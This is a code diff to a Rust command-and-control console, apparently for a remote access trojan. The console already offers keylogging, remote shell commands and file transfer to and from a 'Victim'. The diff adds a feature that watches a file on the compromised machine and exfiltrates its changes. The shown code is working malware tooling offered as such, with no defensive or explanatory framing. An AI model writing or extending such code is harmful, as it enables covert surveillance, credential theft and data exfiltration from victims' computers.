@@ -29,8 +29,10 @@ use packet::{PacketHeader, HEADER_SIZE,
              PACKET_TYPE_ACK, PACKET_TYPE_HEARTBEAT,
              PACKET_TYPE_CMD, PACKET_TYPE_CMD_RESP,
              PACKET_TYPE_CTRL, PACKET_TYPE_FILE, PACKET_TYPE_KEYLOG,
+             PACKET_TYPE_WATCH_DATA, PACKET_TYPE_WATCH_DELETED,
              CTRL_START_KEYLOGGER, CTRL_STOP_KEYLOGGER,
-             CTRL_REQUEST_KEYLOG, CTRL_UNINSTALL};
+             CTRL_REQUEST_KEYLOG, CTRL_UNINSTALL,
+             CTRL_WATCH_FILE, CTRL_STOP_WATCH};
 
 // Configuration
 const BUFFER_SIZE: usize = 4096;
@@ -121,10 +123,12 @@ impl Commander {
         println!("4) Run Shell Command");
         println!("5) Transfer File to Victim");
         println!("6) Transfer File from Victim");
-        println!("7) Uninstall Agent");
-        println!("8) Disconnect");
+        println!("7) Watch File for Changes");
+        println!("8) Stop Watching File");
+        println!("9) Uninstall Agent");
+        println!("10) Disconnect");
         println!("0) Exit Commander");
-        
+
         match prompt("Selection > ").as_str() {
             "1" => self.start_keylogger(),
             "2" => self.stop_keylogger(),
@@ -132,8 +136,10 @@ impl Commander {
             "4" => self.run_program(),
             "5" => self.upload_file(),
             "6" => self.download_file(),
-            "7" => self.uninstall(),
-            "8" => self.disconnect(),
+            "7" => self.watch_file(),
+            "8" => self.stop_watch(),
+            "9" => self.uninstall(),
+            "10" => self.disconnect(),
             "0" => {
                 self.running.store(false, Ordering::SeqCst);
             },
@@ -475,6 +481,36 @@ impl Commander {
         } else {
             println!("\n[!] No data received");
         }
+    }
+
+    fn watch_file(&mut self) {
+        let file_path = prompt("File path to watch: ");
+        
+        if file_path.is_empty() {
+            println!("[!] Invalid path");
+            return;
+        }
+
+        println!("[*] Starting file watch on: {}", file_path);
+        
+        // Send watch request with file path
+        let mut request = Vec::new();
+        request.push(file_path.as_bytes().len() as u8);
+        request.extend_from_slice(file_path.as_bytes());
+        
+        if self.send_packet(PACKET_TYPE_CTRL, CTRL_WATCH_FILE, &request).is_err() {
+            println!("[!] Failed to send watch request");
+            return;
+        }
+        
+        println!("[+] File watch started. Changes will be saved to watched_file_copy.txt");
+        println!("[*] Press Ctrl+C to stop watching and return to menu");
+    }
+
+    fn stop_watch(&mut self) {
+        println!("[*] Stopping file watch...");
+        self.send_control(CTRL_STOP_WATCH);
+        println!("[+] File watch stopped");
     }
 
     fn uninstall(&mut self) {
